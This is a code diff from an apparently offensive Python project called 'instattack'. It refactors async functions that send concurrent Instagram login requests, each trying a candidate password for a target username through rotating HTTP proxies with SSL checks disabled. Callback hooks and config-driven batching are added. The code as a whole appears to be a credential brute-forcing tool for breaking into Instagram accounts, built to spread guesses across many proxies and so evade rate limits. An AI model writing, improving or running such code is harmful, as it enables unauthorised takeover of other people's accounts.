@@ -1,23 +1,23 @@
 import asyncio
 
+from instattack.lib import logger
 from instattack.lib.utils import limit_as_completed, cancel_remaining_tasks
 
-from instattack import settings
+from instattack.config import settings
 from instattack.app.exceptions import PoolNoProxyError
 
 from .models import InstagramResult
 from .exceptions import (
-    InstagramResultError,
-    HTTP_RESPONSE_ERRORS, HTTP_REQUEST_ERRORS,
-    find_request_error, find_response_error)
+    InstagramResultError, HTTP_RESPONSE_ERRORS, HTTP_REQUEST_ERRORS)
 
 
 async def login(
     loop,
     request_context,
     proxy,
-    proxy_callback=None,
-    log=None,
+    on_proxy_response_error=None,
+    on_proxy_request_error=None,
+    on_proxy_success=None,
 ):
     """
     For a given password, makes a series of concurrent requests, each using
@@ -45,6 +45,7 @@ async def login(
     >>>     else:
     >>>         raise e
     """
+    log = logger.get_async(__name__, subname='login')
 
     proxy.update_time()
     result = None
@@ -80,7 +81,7 @@ async def login(
             # Parse JSON First
             json = await response.json()
             try:
-                return await parse_response_result(json, password, proxy)  # noqa
+                return await parse_response_result(json, request_context['password'], proxy)  # noqa
             except InstagramResultError as e:
                 # Be Careful: If this doesn't raise a response the result will be None.
                 response.raise_for_status()
@@ -90,41 +91,28 @@ async def login(
             settings.INSTAGRAM_LOGIN_URL,
             headers=settings.HEADERS(request_context['token']),
             data={
-                settings.INSTAGRAM_USERNAME_FIELD: request_context['user'].username,
+                settings.INSTAGRAM_USERNAME_FIELD: loop.user.username,
                 settings.INSTAGRAM_PASSWORD_FIELD: request_context['password']
             },
             ssl=False,
             proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
         ) as response:
-
             result = await raise_for_result(response)
-
-            proxy.last_request_confirmed = True
-            await proxy.handle_success(save=True)
-            await proxy_callback(proxy)
+            await on_proxy_success(proxy)
 
     except asyncio.CancelledError:
         pass
 
     except HTTP_RESPONSE_ERRORS as e:
-        # await log.error(e, extra={'proxy': proxy})
-
-        err = find_response_error(e)
-        if not err:
-            raise e
-
-        await proxy.handle_error(err)
+        if loop.config['log.logging'].get('request_errors') is True:
+            await log.error(e, extra={'proxy': proxy})
+        await on_proxy_response_error(proxy, e)
 
     except HTTP_REQUEST_ERRORS as e:
-        # await log.error(e, extra={'proxy': proxy})
+        if loop.config['log.logging'].get('request_errors') is True:
+            await log.error(e, extra={'proxy': proxy})
+        await on_proxy_request_error(proxy, e)
 
-        err = find_request_error(e)
-        if not err:
-            raise e
-
-        await proxy.handle_error(err)
-
-    await proxy_callback(proxy)
     return result
 
 
@@ -132,8 +120,9 @@ async def attempt(
     loop,
     request_context,
     pool=None,
-    proxy_callback=None,
-    batch_size=None,
+    on_proxy_response_error=None,
+    on_proxy_request_error=None,
+    on_proxy_success=None
 ):
     """
     Makes concurrent fetches for a single password and limits the number of
@@ -158,7 +147,9 @@ async def attempt(
                 loop,
                 request_context,
                 proxy,
-                proxy_callback=proxy_callback,
+                on_proxy_request_error=on_proxy_request_error,
+                on_proxy_response_error=on_proxy_response_error,
+                on_proxy_success=on_proxy_success,
             )
 
     # TODO:  We should figure out a way to allow proxies to repopulate and wait
@@ -173,6 +164,7 @@ async def attempt(
     # so that we can cancel the leftover ones.
     stop_event = asyncio.Event()
 
+    batch_size = loop.config['instattack']['attack']['attempts']['batch_size']
     async for result, num_tries, current_tasks in limit_as_completed(gen, batch_size, stop_event):
         if result is not None:
             stop_event.set()
